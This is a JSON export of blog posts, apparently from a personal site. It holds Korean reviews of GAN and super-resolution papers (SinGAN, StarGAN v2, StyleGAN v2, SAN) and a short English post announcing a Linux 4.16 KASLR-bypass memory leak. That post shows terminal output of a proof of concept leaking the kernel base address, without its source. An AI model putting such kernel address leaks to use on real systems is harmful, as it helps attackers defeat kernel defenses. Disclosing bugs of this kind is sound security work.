기능인데, 이 것보다 잘하는 거 같네요\n\n![img](editing_result.png)\n\n#### Harmonization\n\nImage 2 장을 합쳤을 때 조화롭게 잘 합쳐주는 지를 보는 task 인데, 이것도 꽤 자연스럽게 잘 되는 것 같아요\n\n![img](harmonization_result.png)\n\n#### Single Image Animation\n한 장의 이미지를 넣어주면 짧은 video clip 을 만들어 주는 task 인데, 이 것도 자연스럽게 잘 되는 것 같네요\n\n[video](https://www.youtube.com/watch?v=xk8bWLZk4DU&feature=youtu.be)\n\n## Conclusion\n\n이번에 SinGAN paper review 를 해 보았는데, 이미지 한 장만 사용한다는 점과 Application 들이 정말 좋았던 paper 였어요.\n\n개인적으론 network 설계나 등등 요소들은 조금 아쉽네요.\n","excerpt":"TL;DR 이번 포스팅에서는 ICCV 2019 에서 Best Paper Awards 에서 선정된 papers 중에 하나인 SinGAN 을 리뷰해 보겠습니다. 개인적으로 정말 재밌게 본 논문이고, ICCV 2019 논문들 중 최고였던거 같아요. 그래서…","fields":{"slug":"/SinGAN/"},"frontmatter":{"date":"Mar 14, 2020","title":"SinGAN - Learning a Generative Model from a Single Natural Image","tags":["Deep-Learning"],"update":"Mar 14, 2020"},"timeToRead":8}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번 포스팅에서는 I2I translation 를 푼 **StartGAN v2** 을 리뷰해 보겠습니다.\n\n평소에 Multi-Domain I2I translation task 에 관심이 많았는데, 작년에 나온 StarGAN 후속작인 StarGAN v2 가 나와서 한번 리뷰해 보려고 합니당\n\n아래는 StarGAN v2 demo 인데, 아래와 같은 느낌입니다.\n\n![gif](celeba_hq_teaser_video.gif)\n\npaper : [arXiv](https://arxiv.org/pdf/1912.01865.pdf)\n\nofficial implementation : [code](https://github.com/clovaai/stargan-v2)\n\n## Related Work\n\n아래는 관련 task 논문들인데 한번 읽어 보세요!\n\n* CycleGAN : [arXiv](https://arxiv.org/pdf/1703.10593.pdf)\n* DiscoGAN : [arXiv](https://arxiv.org/pdf/1703.05192.pdf)\n* StarGAN : [arXiv](https://arxiv.org/pdf/1711.09020.pdf)\n* MUNIT : [arXiv](https://arxiv.org/pdf/1804.04732.pdf)\n* DRIT : [arXiv](https://arxiv.org/pdf/1905.01270.pdf)\n* MSGAN : [arXiv](https://arxiv.org/pdf/1903.05628.pdf)\n* RelGAN : [arXiv](https://arxiv.org/pdf/1908.07269.pdf)\n\n## Introduction\n\n기존의 여러 Multi-Domain I2I translation 연구들로 대표적으로 Pix2Pix, CycleGAN, DiscoGAN, MUNIT, StarGAN 등등이 있어요.\n그런데 요런 2 가지를 만족하지는 못하는 한계가 있었습니다.\n\n1. 한정된 domain 들 내에서만 translate (눈, 코, 입, 턱수염, 표정)\n2. 한 번에 1 가지 domain 에 대해서 translate (A->B, B->A)\n\n즉, 기존의 Multi-Domain I2I translate task 에서는 generator 에 *one-hot* or *multi-hot* attribute vector 를 input 에 합쳐주는 방식이였습니다.\n\n이번 논문에서는 이러한 한계들을 극복하고자 다음과 같은 목표를 제시했는데,\n\n1. 여러 domain 에 대해서 모두 translate 가능\n2. 특정 domain 에 대한 여러 가지 style 에 대해서 translate 가능\n\n요런 것들을 가능하게 합니다.\n\n## Architecture\n\n먼저 아래는 StarGAN v2 architecture 간단한 overview 인데, \n아래 목적을 간단하게 설명하면 *image x* 와 *image y* 가 있다면, Generator 로 *image x* 에 대응되는 *image y* 의 각 domain 의 다양한 이미지들을 생성하는 겁니다.\n\n![img](overview_of_starganv2.png)\n\n각 Network 들의 역할을 알아보면 다음과 같아요.\n\n### Generator (G)\n\n*image x* 가 입력으로 들어오고 중간에 *domain-specific style code s* vector 가 들어와서 output image 를 만듭니다.\n\n> *$output = G(x, s)$*\n\n여기서 *s* 는 *mapping network* 나 *style encoder* 에서 만들어진 *style vector* 입니다.\n\n즉, 이미지 한 장을 받고 어떤 style 을 받으면 해당 style 을 반영한 결과물 무언가를 만들어 내는 아이입니다.\n\n### Mapping Network (F)\n\n*mapping network*, *F* 는 *latent code z* 와 *domain y* 에 대해서, *style code*를 만드는 network 인데, 대충 공식은 이렇게 됩니다.\n\n> *$s = F_y(z)$*\n\n즉, *domain y* 를 represent 하는 *latent code z* 를 *style code s* 로 mapping 해 주는 역할을 합니다.\n\n*F* 는 간단한 여러 FC layers 들의 combination 인데, 모든 multiple-domains 에 해당하는 style codes 를 주기 위해서, multiple-outputs 를 가지는 구조랍니다.\n\n### Style Encoder (E)\n\n*image x* 와 *domain y*가 있다면 *E* 는 *image x* 에서 style information 을 추출하는 역할을 해요.\n\n> *$s = E_y(x)$*\n\n*E* 는 reference image 에 대해서 다양한 style code 들을 생성하는 역할을 해요. 이렇게 생성된 style code 들을 *G* 에서 이미지를 생성할 때 사용됩니다.\n\n% *E* 도 위의 *F* 와 똑같은 multi-task scheme 을 따릅니다.\n\n### Discriminator (D)\n\n*D* 도 위와 같은 scheme 으로 multi-task wise 한 구조를 가집니다. 즉, multiple output branch 를 가집니다.\n\n## Technical Review\n\n### Adversarial Loss\n\nGAN loss 같은 경우엔 WGAN, WGAN-GP, hinge-loss based gan loss 가 아닌 vanila gan loss 를 사용했네요.\n\n> $L_{adv} = E_{x,y}[log D_y(x)] + E_{x,\\tilde{y},z}[log (1 - D_{\\tilde{y}}(G(x, \\tilde{s})))]$\n\n### Style Reconstruction Loss\n\n*style code* 를 training 하기 위해서, *l1 loss* 를 사용합니다. \nloss 에 다른 특별한 점은 없지만 하나의 Encoder 로 multiple domains 들의 feature 를 추출한다는 게 큰 특징/차이가 되겠네요.\n\n> $L_{sty} = E_{x,\\tilde{y},z}[\\|\\tilde{s} - E_{\\tilde{y}}(G(x, \\tilde{s}))\\|_1]$\n\n### Style Diversification Loss\n\nstyle 다양성을 위해선 *diversity sensitive* 한 loss 로 generator 를 regularize 해야 한다고 합니다.\n\nrandom latent code $z_1$, $z_2$ 에서 생성 된 $s_1^~$, $s_2^~$ 들을 (굳이 수식으로 쓰면 아래와 같음)\n*image x* 와 *G* 로 생성한 *output* 들의 *l1 loss* 를 구합니다.\n\n> $s_{\\tilde{i}} = F_{\\tilde{y}}(z_i), i \\in {1, 2}$\n\n> $L_{ds} = E_{x,\\tilde{y},z_1,z_2}[\\|G(x, \\tilde{s_1}) - G(x, \\tilde{s_2})\\|_1]$\n\n논문에선 이 loss 의 *optimal point* 는 존재하지 않아서, *$L_{ds}$* 의 loss weight 를 0 까지 linearly decay 시킨다고 합니다.\n\n### Preserving Source Characteristics\n\n위의 loss 들만으로는 생성물이 어떤 결과물이여야 하는지를 preserve 하지 못하는데, \n결과물은 반드시 *domain-invariant* 한 특성을 가지고 있어야 합니다. 이걸 잘 하는게 목표니까요!\n\n이 부분을 해결하기 위해선 여러 task 에서 사용하고 있는 공식 loss 인 *cycle consistency loss* 를 쓰죠.\n\n> $L_{cyc} = E_{x,y,\\tilde{y},z}[\\|x - G(G(x, \\tilde{s}), \\hat{s})\\|_1]$\n>\n> $\\hat{s} = E_y(x)$\n\n### Total Loss\n\n총 4 가지 type 의 loss 를 사용해서 아래와 같습니다.\n\n> $L_D = - L_{adv}$\n>\n> $L_{F,G,E} = L_{adv} + \\lambda_{sty} * L_{sty} - \\lambda_{ds} * L_{ds} + \\lambda_{cyc} * L_{cyc}$\n\n전체적으로 loss 는 간편한 편이고 *zero cycle consistency loss* 나 등등의 loss 를 사용하지 않아도 *identity* 보존이나,\n등등을 잘 하나 봅니다\n\n## Architectures\n\n### Generator\n\n처음에 독특(?)한 scheme 으로 1x1 conv2d 를 사용 해 주고, pooling 은 average pool, up sample 은 nn interpolation 을 사용.\nencoder part 에는 instance normalization (IN), decoder part 에는 adaptive instance normalization (AdaIN). \n유명한 convention(?) 이니 norm 위치 설명은 여기까지.\n\n마지막 activation 은 tanh 나 sigmoid 로 scaling 하지 않고 model 자체가 color range 를 학습하도록 했답니다.\n\n개인적으로도 image generation task 에서 이렇게 scaling 하지 않았을 때 더 좋은 결과가 나왔던 경우가 많았던 것 같아요\n\n![img](generator-architecture.png)\n\n### Mapping Network\n\n전체적인 구조는 16 dims 의 latent z 를 받고, 512 dims 의 fc layers 6 개를 통과하고 64 dims 의 style code 로 projection 하네요. (N 은 branch 개수)\n\nlatent z 는 standard gaussian distribution wise 하고 \n실험 결과, 이번 task 에 pixel / feature normalizations method 들의 성능이 별로 안좋았다고 캅니다.\n\n![img](mapping-network-architecture.png)\n\n### Style Encoder & Discriminator\n\n평범한 구조인데, 특이점은 normalization 을 사용하지 않았고, PatchGAN wise 하게 접근 하지 않았다는 점입니다.\n\n또한, conditional 보다 multi-task discriminator 가 더 좋은 성능을 보인다고 하군요.\n\nSpectral Normalization (SN) 에 대한 언급은 없네용\n\n![img](style-encoder-architecture.png)\n\n### Parameters\n\nadversarial loss 엔 R1 regularize (w/ $r$ = 1) 를 하고,\n\nloss weight 는 뭐 적당히\n\nAdam optimizer param 으로 beta1, beta2 = (0, 0.99), lr = 1e-4 (for G, D, E) / lr = 1e-6 (for F)\n\nweight initialize 는 HE initlaizer 로 bias 는 0, AdaIN layer 의 bias 는 1 로 설정 했답니다.\n\n## Experiment Result\n\n이전 여러 method 들 (MUNIT, DRIT, MSGAN) 과 비교를 위해서 여러 evaluation metrics 과 2 개의 perspectives 로 image synthesis performance 를 비교해 봤는데,\n**latent-guided synthesis**, **reference-guided synthesis** 입니다.\n\n간단하게는, noise 로 부터 얼마나 이미지를 잘 생성하는지, reference image 로 부터 얼마나 feature 를 잘 뽑아서 generate 하는 지를 보는 겁니다.\n\ndataset 은 *CelebA-HQ* 와 *AFHQ* 를 사용했답니다.\n\n### 정량적인\n\n이쪽 task 에서 주로 많이 사용하는 정량적인 metric 으로 여러 개가 있는데 Frechet Inception Distance (FID), Learned Perceptual Image Patch Similarity (LPIPS) 을 사용했습니다.\n\n#### Latent-Guided Synthesis\n\n값만 간단하게 비교하면 *StarGANv2* 가 \n\n*CelebA-HQ* 에서는 FID **18.0**, LPIPS **0.428** \n*AFHQ* 에서는 FID **24.4**, LPIPS **0.524** 가 나왔는데,\n\n각 dataset 의 real images 의 FID 는 **15.0** / **13.1** 인 수준입니다. \n이전 method 들 보다 성능이 훨씬 좋고 거의 실사 이미지와 비슷하다고 볼 수 있죠\n\n![img](latent-guided-synthesis-on-datasets.png)\n\n#### Reference-Guided Synthesis\n\n값만 간단하게 비교하면 *StarGANv2* 가 \n\n*CelebA-HQ* 에서는 FID **20.2**, LPIPS **0.397** \n*AFHQ* 에서는 FID **19.7**, LPIPS **0.503** 가 나왔는데,\n\n각 dataset 의 real images 의 FID 는 **15.1** / **13.1** 인 수준입니다. \n이전 method 들 보다 성능이 훨씬 좋고 (x2, x3.5) 거의 실사 이미지와 비슷하다고 볼 수 있죠\n\n![img](reference-guided-synthesis-on-datasets.png)\n\n아래는 CelebA-HQ 로 트레이닝을 하고 FFHQ 로 inference 한 결과물인데, dataset 에 distribution gap 이 있을 텐데도 reference image 의 style 을 잘 잡네요.\n\n![img](reference-guided-synthesis.png)\n\n### 정성적인\n\n#### AMT\n\n요즘 핫한 evaluation method 인데, 저번 paper review 때도 소개했었습니다.\n\n진행 방식은 다음과 같은데, (총 100 문제, 10 명)\n\nsource 와 reference 이미지 pair 로 주고 각 method 들로 생성한 이미지를 주고,\n\n1. 어느 method 가 가장 이미지 퀄이 높고 \n2. reference image 를 잘 고려해서 생성했는지\n\n를 물어본 결과 \n\n*CelebA-HQ data*로 트레이닝 한 모델 case 에선, StarGANv2 가 quality 는 *70 votes*, style 은 *75 votes*\n\n*AFHQ data*로 트레이닝 한 모델 case 에선, StarGANv2 가 quality 는 *88 votes*, style 은 *92 votes*\n\n를 받아서 압도적으로 좋은 것을 증명했다고 캅니다.\n","excerpt":"TL;DR 이번 포스팅에서는 I2I translation 를 푼 StartGAN v2 을 리뷰해 보겠습니다. 평소에 Multi-Domain I2I translation task 에 관심이 많았는데, 작년에 나온 StarGAN 후속작인 StarGAN …","fields":{"slug":"/StarGANv2/"},"frontmatter":{"date":"Mar 14, 2020","title":"StarGAN-v2 - Diverse Image Synthesis for Multiple Domains review","tags":["Deep-Learning"],"update":"Mar 14, 2020"},"timeToRead":9}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번 포스팅에서는 리뷰할 논문은 지난 19년 11월에 나온 **StyleGAN v2**를 리뷰 해 보겠습니다\n\nStyleGAN 에 이어서 2 번째 논문인데, 이번 버전에서는 어떤 문제점들을 어떻게 해결했는지를 한번 보려고 합니다!\n\n아래는 StyleGAN v2 로 생성한 이미지들 입니다.\n\n![img](stylegan2-teaser-1024x256.png)\n\npaper : [arXiv](https://arxiv.org/pdf/1912.04958.pdf)\n\nofficial implementation : [code](https://github.com/NVlabs/stylegan2)\n\n## Related Work\n\n요건 이전 버전 StyleGAN paper 입니다.\n\n* StyleGAN : [arXiv](https://arxiv.org/pdf/1812.04948.pdf)\n\n## Introduction\n\n이번 논문에서는 이전에 발표한 StyleGAN 의 artifacts 들에 대해 지적하면서 시작합니다.\n\n요약 해 보면 크게 3개의 문제점을 지적 / 개선 / 해결 했는데, \n\n1. blob-like artifacts\n2. artifacts related to progressive growing\n3. metrics for evaluating GAN performance\n\n### blob-like artifacts\n\nStyleGAN 에서 *Instance Normalization* 이 아래 이미지 처럼 water droplet 과 같은 artifacts 를 발생한다고 합니다. \n\n![img](droplet-llike-artifacts.png)\n\n*generator* 의 activation map 을 보면 (오른쪽 사진들) 자국 같은 것 들이 보일텐데, 설계상 때문에 요게 문제가 됐다는 겁니다.\n\n그래서 StyleGANv2 에서는 새로운 normalization method 를 사용해서 이 문제를 해결합니다.\n\n### artifacts related to progressive growing\n\nhigh-resolution GAN 에서 stable 한 훈련을 위해 low resolution 부터 훈련을 시작하는 progressive 한 훈련 방식을 해 왔었는데,\n이전에는 각 resolution 마다 같은 network 구조를 사용했는데, 다른 resolution 을 훈련할 때는 다른 network topology 를 사용해야 한다는 말 입니다.\n\n매 resolution 마다 같은 구조가 아닌 다른 구조로 학습을 하게 되면, 각 resolution 에 맞게 더 효율적으로 훈련할 수 있다는 논문피셜 입니다.\n(당연한 이야기긴 하지만)\n\n### metrics for evaluating GAN performance\n\nGAN 생성 이미지 quality 를 측정하기 위해 여러 metric 들을 사용하는데 (e.g. FID, precision, recall),\n이런 metric 들의 문제점을 제기하고 새로운 gan metric 을 사용해서 performance 를 측정했다고 합니다.\n\n간단하게 설명 해 보면, 위에 소개된 이전 metric 들은 inception v3 같은 base network 에 기반해서, 전반적인 texture 보다 shape 같은 것에 집중을 하는데,\n결론적으로 이미지 quality 전반적인 면을 capture 하지 못한다는 말 입니다.\n\n그래서 이런 문제가 어느 정도 해결 한 perceptual path length (PPL) metric 을 사용했다고 합니다.\n \n### etc\n\n마지막으론 latent space $W$ 가 더 잘된다고 하네요\n \n## Architecture\n\n결론적으로 아래와 같은 변경 사항들로 \n\n1. characteristic artifacts 들을 제거하고 \n2. full controllability 를 유지한다.\n\n### removing normalization artifacts \n\n위에 introduction 에서 *instance normalization* 때문에 blob-like 한 artifacts 가 생긴다고 했는데,\n최종 이미지 (1024x1024) 에서는 안 보일 수 있어도, 중간 이미지 (64x64) 쯤 부터 발생하는 걸 볼 수 있는데, \n이런 부분을 *discriminator* 에서 잡을 수 있어야 하겠죠?\n\n*AdaIN* 같은 operation 이 각 features 별 *mean*, *variance* 를 따로따로 normalize 하기 떄문이라 원인을 밝힙니다.\n(논문에선 generator 가 의도적으로 signal strength 정보를 이전 *IN* 으로부터 sneak 한다고 표현돼 있어요)\n\n결론은 이런 normalization step 이 없어지면 이런 droplet artifacts 가 없어질 거라 합니다.\n\n### generator architecture revisited\n\n아래가 과거 (StyleGAN) / 현재 (StyleGANv2) *generator* architecture 비교 샷 인데, \n*AdaIN* operation 을 normalization, modulation step 으로 분리해서 보여줬네요.\n\n과거에는 *bias* 하고 *noise* 를 *style block* 에 적용 해 줬는데, 이런 상대적인 영향이 게 style magnitude 에 반비례하게 적용된다고 합니다.\n\n그래서 이런 operation 을 *style block* 밖으로 빼면서 조금 더 predictable 한 결과를 가져갈 수 있었다고 해요.\n\n![img](stylegan2-architecture.png)\n\n그리고 한 가지 더, *AdaIN* (normalize & mod) 를 *mean*, *std* 둘 다가 아닌 *std* 에만 적용 하는 것만으로도 충분 하다고 합니다.\n\n### instance normalization revisited\n\n이전 *instance normalization* 은 style 에 너무 strong 한 영향을 끼쳤었고, 이를 그럼 어떻게 scale-specific 영향을 style 에 그래도 주면서, 좀 relaxing 할 수 있을까 했는데,\n\n1. 일단 *batch normalization* 은 안됨. (small mini-batches 에서 high-resolution synthesis 엔 부적합)\n2. 그냥 *instance normalization* 제거. -> 실제로 성능 증가 (효과있음)\n\n그런데, 이렇게 제거 해 버리는 것은, scale-specific 보다 style cumulative 한 거에 영향을 주었고, \nStyleGAN 의 **controllability** 를 잃어 버리게 됐답니다.\n\n그래서 새로운 방법을 제안했는데, **controllability** 를 유지하면서, *instance normalization* 으로 인한 artifacts 는 제거하는 방법.\n\n*modulation*, *convolution*, *normalization* 에서 *modulation* 부분을 생각 해 보면,\n\n들어오는 style 에 의해서 (위 그림에서 A) *modulation* 각 convolution 의 feature map 을 scale 하는데,\n이 부분을 아래처럼 구현이 가능 합니다.\n\n> *$w`_{i,j,k} = s_i \\cdot w_{i,j,k}$*\n\n$w$ 는 일반 weight 이고, $w`$ 이 modulated weight, $s$ 는 scale 인데, $i$ 번째 input feature map, $j,k$ 는 output feature map 에 해당. \n\n이렇게 하게 되면, 위 처럼 제안된 *instance normalization* 은 $s$ effect 를 output feature maps distribution 에서 제거할 수 있어요.\n\n결론적으로 위에 (d) 그럼처럼, 이제 *style block* 은 하나의 *convolution layer* 로 구성될 수 있네요. (conv weight 는 $s$ 에 의해 adjust 됨)\n\n(논문 뒤엔 이거에 대한 이야기가 더 있는데 skip)\n\n그래서 아래와 같이 blob-like artifacts 들을 해결 했답니다.\n\n![img](stylegan2-resolve-artifacts.png)\n\n### etc\n\ntraining technique 들도 몇 개 소개되었는데, 그렇게 여러 기술들이 덕지덕지 적용되지 않고 깔-끔 합니다.\n\n다른 거 붙이는 거 비해 computation cost 가 적게들고, memory 사용량 down 등의 이유를 들었네요.\n\n1. Loss : logistic loss\n2. Lazy Regularization : $R_1$ regularization (every 16 mini-batches 마다 1 번)\n3. Path Length Regularization : poor local conditioning 을 피해기 위한 method 인데, Jacobian Matric 연산의 heaviness 를 해결하기 위해 identity 등을 사용 하는 등 이야기가 논문에 나옵니다.\n결론적으로, 조금 더 reliable 하고 consistently 동작하는 모델이 됐다고 캅니다.\n\n> *$E_{x,y~N(0, I)}(\\|\\|J^T_wy\\|\\|_2 - \\alpha)^2$*\n\n*$J_w$* 가 orthogonal matrix 니, 이런 matrix 는 lengths 를 보존하겠죠? (어떤 dimension 에 대해서 squeezing 없고)\n\nconstant *$\\alpha$* 가 training 중 path lengths 의 exponential moving average 값을 optimize 되게 해 줍니다\n\n## Experiment Result\n\nFFHQ / LSUN Car dataset 에서 퍼포먼스는 아래와 같아요. 총 4가지 metrics 을 사용해서 evaluate 했습니다.\n\n1. Frechet Inception Distance (FID)\n2. Perceptual Path Length (PPL)\n3. Precision\n4. Recall\n\n![img](stylegan2-results.png)\n\n이 외에도 이전 StyleGAN 과 PPL distribution 차이 여러 가지 analysis 가 있습니당\n\n나머지는 논문 참고하세요~ (~~귀찮~~)\n\n## Conclusion\n\n이번 논문도 엄청 재미있는 approach 들이 많아서 재밌었는데,\n매번 느끼지만 nvidia labs 는 이전 연구들의 root cause 를 잘 잡고 좋은 결과들을\n매번 보여주네요.\n\n결론 : 마음에 드는 논문\n","excerpt":"TL;DR 이번 포스팅에서는 리뷰할 논문은 지난 19년 11월에 나온 StyleGAN v2를 리뷰 해 보겠습니다 StyleGAN 에 이어서 2 번째 논문인데, 이번 버전에서는 어떤 문제점들을 어떻게 해결했는지를 한번 보려고 합니다! 아래는 Style…","fields":{"slug":"/StyleGANv2/"},"frontmatter":{"date":"Mar 14, 2020","title":"StyleGAN-v2 - Analyzing and Improving the Image Quality of StyleGAN","tags":["Deep-Learning"],"update":"Mar 14, 2020"},"timeToRead":6}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n이번 포스팅에서는 리뷰할 논문은 *SAN* (Second-order Attention Network) 이라는 Image Super Resolution task 에서 현재 여러 test set 에서 제일 높은 성능 (19년도 기준)을 보이고 있는 architecture 입니다.\n\n이 때 까지도 여러 attention module 들을 붙여서 super resolution network 의 성능을 올리는 데 trend 였는데, 재밌는 (?) approach 를 해서 리뷰 해 보게 됐습니다.\n\npaper : [CVPR19](http://openaccess.thecvf.com/content_CVPR_2019/papers/Dai_Second-Order_Attention_Network_for_Single_Image_Super-Resolution_CVPR_2019_paper.pdf)\n\nofficial implementation : [code](https://github.com/daitao/SAN)\n\n## Related Work\n\n요건 다른 Super Resolution 들 paper list 입니다.\n\n* DBPN : [arXiv](https://arxiv.org/pdf/1803.02735.pdf)\n* ESRGAN : [arXiv](https://arxiv.org/pdf/1809.00219)\n* RCAN : [arXiv](https://arxiv.org/pdf/1807.02758.pdf)\n\n## Introduction\n\n이전에 여러 SISR (Single Image Super Resolution) task 들의 network 들은 *더 넓고 깊은 구조*를 띄면서, 상대적으로 network 의 \n\n1. *representation 능력*\n2. *각 중간 layer 들의 feature correlation*\n\n들을 덜 고려하는 경향을 보였다면서, 이번에 **SAN** (Second-order Attention Network) 를 제안하면서, 이런 문제들을 더 고려한 구조를 맨들어 봤다고 캅니다.\n\n기존 *SE* (Squeeze and Excitation) Module 은 *Squeeze* stage 에서 *GAP* (Global Average Pooling) 을 하면서 first-order distribution feature 밖에 학습하지 못했는데,\n여기 **SOCA Module** 이라 부르고 attention network 에선 second-order-tic 하게 연산을 위한 operation 이 들어가서 adaptive 하게 feature 를 rescaling 했다고 하는데, 궁금해지네요.\n\n## Architecture\n\n*SAN* 는 4 가지 부분으로 구성이 되어 있는데요,\n\n1. shallow feature extraction\n2. non-locally enhanced residual group (NLRG)\n3. up-scale module\n4. reconstruction part\n\n입니다.\n\n전반적인 **SAN** architecture 는 아래 사진과 같습니다.\n\n![img](overall_architecture.png)\n\n### 1. shallow feature extraction\n\n논문에서 자기들은 shallow feature extraction 을 위해서 LR (Low Resolution) 이미지로 부터 오직 convolution layer 1 층만 쌓았다고 합니다.\n\n그냥 평범한 convolution2d 하나입니다.\n\n### 2. non-locally enhanced residual group (NLRG)\n\n*MLRG* module 은 크게 2 가지로 구성되어 있는데,\n\n1. 여러 개의 region-level non-local (RL-NL)\n2. 하나의 share-source residual group (SSRG)\n\n#### RL-NL\n\n논문에서 RL-NL Module 은 *LR* 에서 구조적인 feature 들을 잘 따내고, *HR* 의 nature-scene 의 self-similarities 도 \n잘 가져올 거라고 합니다.\n\n위치 상으로 역할이 SSRG 구조 이전/후에 사용되면서, high-level 에서 여러 넓은 범위의 정보들을 잘 catch 하는 module 이네요.\n\n논문에서 이전에 global-level non-local operation 을 사용 하는 거에 대한 한계점들을 들었는데요,\n\n1. unacceptable computational burden\n2. non-local operations at a proper neighborhood size are preferable for low-level tasks\n\n즉, global-level 에서 사용하면, feature size 가 큰 경우에 연산이 너무 heavy 해 진다는 단점과,\n주로 이런 연산들은 low-level, global-level 이 아닌 곳에서 사용되었다 라는 점인데요.\n\n그래서 이 논문에선, region-level 에서 해당 연산을 합니다. 즉 *k x k* 개의 regions 들로 나누고, 해당 region 들에 대해서 non-local operations 을 합니다.\n\n아래는 RL-NL Module 구조 사진입니다.\n\n![img](RL-NL-module.png)\n\n#### SSRG\n\n*SSRG* 는 Local Source Residual Attention Group (LSRAG) 들이 share-source skip connection (SSC) 로 구성 되어 있습니다.\n\nLSRAG Module 은 *simplified* residual blocks (w/ local-source skip connection) 들로 구성이 되어 있고, \nfeature inter-dependencies 를 잘 구하기 위한, 이 논문에서 제안한 SOCA Module 들이 붙어 있습니다.\n\n특징은 다른 SR architecture 보다 light 하게 network 를 쌓았는데, 논문에서 residual blocks 을 깊게 쌓으면 여러 가지 문제가 있을 수 있다며 \nLSRAG Module 을 기본 param 들을 사용했다고 했어요.\n\n그냥 이렇게 간단하게만 쌓으면 좋은 성능이 나올 수 없다고 하면서 share-source skip connection (SSC) 를 언급했는데요,\nSSC 사용으로 깊은 network 를 잘 훈련 시키면서 충분하게 LR 이미지로 부터 low-frequency 정보들을 잘 가져올 수 있다고 합니다.\n\n아래와 같은 convention 으로 쌓았는데, LSRAG $g$ 번 째 group 을 식으로 표현하면 이렇게 계산합니다.\n\n> $F_g = W_{SSC} F_0 + H_G(F_{G-1})$\n\n$W_SSC$ 는 convolution weight 인데 **0 으로 초기화**를 하고, 학습하면서 점차점차 shallow feature 들을 add 하는 방향으로 학습합니다.\nbias 는 false 네요 (~~배우신 분~~)\n\n결론적으로 SSRG structure \n\n아래는 LSRAG / SOCA Module 구조 입니다.\n\n![img](LSRAG-module.png)\n\n#### Second-Order Channel Attention (SOCA)\n\nIntroduction 에서 간단하게 설명은 했는데, 구체적으로 한번 다뤄볼께요.\n\n이전 channel-attention module 에서 *squeeze* stage 에선 *GAP* 등의 연산을 통해 정보를 압축했어요.\n즉, first-order statistics 이상의 정보를 고려하지 않았다는 것을 논문에서 언급합니다.\n\n##### Covariance Normalization\n\nCovariance Normalization 를 하는 이유는, 더 discriminative representation 을 학습하는 데 중요한 역할을 한다고 하네요.\n\n간단한 연산이니, 아래 공식만 적어두겠습니다.\n\n> $\\hat{Y} = \\sigma ^ \\alpha = U A^\\alpha U^T$\n\n결론적으로, $\\alpha < 1$ 일 때, eigenvalues 들이 non-linear 하게 잘 동작하고, $\\alpha = 1 / 2$ 일 때 제일 좋다고 하네요.\n\n이후 Channel-Attention part 는 SE operation 하고 동일합니다.\n\n즉, 연산적으로 결론은 기존 *Global Average Pooling (GAP)* 대신 *Global Covariance Pooling (GCP)* 로 바꾼겁니다.\n\n이후에 GPU 에서 EIG 를 빠르게 구하기 위해서 *Newton-Schulz iteration* 을 했다고 하는데, 이 부분은 생략하겠습니다.\n\n### 3. up-scale module\n\n논문에서 여러 이유를 들려고 하는데, 결론은*bi-linear* up-sampling 을 사용했어요.\n\n### 4. reconstruction part\n\n이 부분도 특별한 점 없이 RL-NL Module 이후 convolution layer 1 층 쌓은 구조 입니다.\n\n### Etc\n\n* Channel-Attention 때 *fc* 가 아닌 *1x1 conv2d* 로 projection 함.\n* reduction ratio 는 $r = 16$\n* 나머지 convolution 들 *kernel size = 3*, *channel = 64*\n* LSRAG Module *group = 20*\n* RL-NL $k = 2$\n* $m = 10$ residual block, single SOCA module at the tail\n\n## Experiment Result\n\n### Set5 PSNR Performance\n\n논문에서 제안된 각 module 들을 one by one 추가 했을 때 성능 차이를 보여주는데, 확실 하게 *FOCA vs SOCA* 비교만 봐도 성능 차가 있네요.\n\n![img](SAN-psnr-performance.png)\n\n### Urban100 PSRN / SSIM Benchmark\n\n이전에 나온 다른 논문들하고 성능 비교를 해 봐도 SAN 이 확실하게 성능이 더 좋은걸 볼 수 있네요\n\n![img](SAN-performance-benchmark.png)\n\n### Computational and Parameter comparison\n\nnetwork 규모 대비 성능을 비교해 놓은 benchmark table 인데, 꽤 괜찮은 가성비(?)를 보이네요.\n\n![img](SAN-parameter-comparison.png)\n\n## Conclusion\n\n뭔가 attention 끝을 보려고 하는 논문이네요.\n\nSISR task 도 요즘 light-weight 지향하는 trend 도 많이 보이고 있는데, \n이 쪽 연구 쪽도 재밌는 게 많이 나오면 좋겠네요.\n\n결론 : 기승전 attention\n","excerpt":"TL;DR 이번 포스팅에서는 리뷰할 논문은 SAN (Second-order Attention Network) 이라는 Image Super Resolution task 에서 현재 여러 test set 에서 제일 높은 성능 (19년도 기준)을 보이고 있…","fields":{"slug":"/SAN/"},"frontmatter":{"date":"Mar 14, 2020","title":"SAN Second-order Attention Network for Single Image Super-Resolution","tags":["Deep-Learning"],"update":"Mar 14, 2020"},"timeToRead":6}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nAbout my recent founds :)\n\nI found a bug, memory leak on v4.16.0-rc5. (KASLR Bypass). Maybe, it works on many LKs (i didn't check all of them yet).\n\n(Of course, it's not kptr_restrict stuff :))\n\nExcept this, there're some bugs, also memleak. But i didn't make them into useful codes :).\n\n## Demo Screen...\n\n![leak](poc.jpg)\n\n```c\nzero@zer0day:/tmp$ uname -a\nLinux zer0day 4.16.0-rc5+ #19 SMP Sun Mar 18 20:44:40 KST 2018 x86_64 GNU/Linux\nzero@zer0day:/tmp$ ./leak\nzero@zer0day:/tmp$ ./leak 1\n[+] Found Kernel Base Address!\n[+] kbase : 0xffffffff89e00000\nzero@zer0day:/tmp$ su\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\nffffffff89e00000 T _text\nroot@zer0day:/tmp#\n```\n\n[+] Today (2018-03-29), found another kaslr bypass (kaddr leak), but it seemed to be weird...\n\n```c\nzero@zer0day:/tmp$ ./leak\n...\nzero@zer0day:/tmp$ ./leak 1\n[+] Found Kernel Base Address!\n[+] kbase : 0xffffffffb2600000\nzero@zer0day:/tmp$ ls\nleak  leak.c\nzero@zer0day:/tmp$ su\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\nffffffffb2600000 T _text\nroot@zer0day:/tmp# uname -a\nLinux zer0day 4.16.0-rc7+ #22 SMP Thu Mar 29 16:46:52 KST 2018 x86_64 GNU/Linux\n```\n\n**End**\n","excerpt":"TL;DR About my recent founds :) I found a bug, memory leak on v4.16.0-rc5. (KASLR Bypass). Maybe, it works on many LKs (i didn't check all …","fields":{"slug":"/KASLR-bypass/"},"frontmatter":{"date":"Jul 20, 2018","title":"LK v4.16.x KASLR Bypass","tags":["Security","Linux-Kernel"],"update":"Jul 20, 